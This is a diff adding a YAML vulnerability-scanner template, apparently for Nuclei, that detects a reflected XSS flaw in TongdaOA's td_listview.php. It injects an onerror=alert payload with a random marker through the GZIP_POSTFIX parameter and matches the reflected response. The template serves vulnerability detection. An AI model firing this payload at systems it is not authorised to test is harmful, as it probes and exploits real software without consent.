@@ -1,0 +1,28 @@
+id: poc-yaml-tongda-td-listview-php-xss
+info:
+  name: TongdaOA td_listview.php Reflected XSS Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: xss
+  metadata:
+    product: TongdaOA
+
+variables:
+  t1: "{{md5(rand_int(100, 10000))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/module/html_editor/editor/plugins/td_listview/td_listview.php?GZIP_POSTFIX=%22+onerror=alert({{t1}})+a=1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "onerror=alert"
+          - "{{t1}}"
+          - "内部数据"
